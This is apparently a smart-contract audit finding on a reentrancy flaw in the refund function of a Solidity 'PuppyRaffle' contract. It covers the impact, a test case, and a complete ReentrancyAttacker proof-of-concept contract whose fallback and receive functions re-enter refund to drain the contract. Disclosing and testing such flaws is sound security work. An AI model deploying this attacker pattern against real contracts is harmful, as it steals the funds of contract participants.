## [S-002] Reentrancy Vulnerability in `PuppyRaffle` Contract (Root: Lack of Checks + Impact: Fund Drainage)

### Description:
The `PuppyRaffle` contract is vulnerable to reentrancy attacks in the `refund` function. This vulnerability arises from the contract's handling of refunds, where it performs state changes after transferring funds to the caller. An attacker can exploit this vulnerability by recursively calling the `refund` function before the state changes take effect, thereby repeatedly draining funds from the contract.

### Impact:
If exploited, the reentrancy vulnerability allows an attacker to drain funds from the `PuppyRaffle` contract, potentially resulting in financial loss for the contract and its participants. Additionally, the vulnerability undermines the integrity and fairness of the raffle system by enabling unauthorized fund withdrawals.

### Proof of Concept:
The proof of concept involves creating a `ReentrancyAttacker` contract that recursively calls the `refund` function of the `PuppyRaffle` contract before the state changes are finalized. By exploiting this vulnerability, the attacker can drain funds from the `PuppyRaffle` contract.

#### Code Snippet:
```solidity
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable {
        _stealMoney();
    }

    receive() external payable {
        _stealMoney();
    }
}
```

Example Test Case: test_Reentrant_refund
Description:
The test_Reentrant_refund function is a test case designed to demonstrate the reentrancy vulnerability in the PuppyRaffle contract. 
It simulates an attack scenario where an attacker contract recursively calls the refund function to drain funds from the PuppyRaffle contract.

Proof of Concept:
The test function enters four players into the raffle and initializes a ReentrancyAttacker contract.
The attacker contract attempts to recursively call the refund function of the PuppyRaffle contract before the state changes take effect.
The test function verifies the ending balances of both the attacker contract and the PuppyRaffle contract to confirm fund drainage.
